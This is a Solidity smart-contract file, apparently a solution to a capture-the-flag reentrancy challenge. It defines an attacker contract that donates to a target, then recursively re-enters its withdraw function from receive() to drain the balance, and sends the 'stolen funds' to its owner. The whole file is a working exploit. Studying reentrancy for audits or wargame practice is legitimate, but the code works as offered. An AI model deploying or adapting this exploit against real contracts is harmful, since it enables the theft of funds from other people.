// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
    function balanceOf(address _who) external view returns (uint256);
}

contract ReentranceAttacker {
    IReentrance public target;
    uint256 public withdrawAmount;
    address public owner;

    constructor(address _target) {
        target = IReentrance(_target);
        owner = msg.sender;
    }

    // Start the reentrancy attack
    function attack() external payable {
        require(msg.value > 0, "Need ETH to attack");
        withdrawAmount = msg.value;

        // Step 1: Donate to establish balance in target contract
        target.donate{value: msg.value}(address(this));

        // Step 2: Trigger first withdrawal (will recursively call itself)
        target.withdraw(msg.value);
    }

    // This function is called when target sends ETH back
    // It triggers the reentrancy by calling withdraw again before state is updated
    receive() external payable {
        if (address(target).balance >= withdrawAmount) {
            target.withdraw(withdrawAmount);
        }
    }

    // Collect all stolen funds back to owner
    function collectFunds() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }

    // View current balance of this contract
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
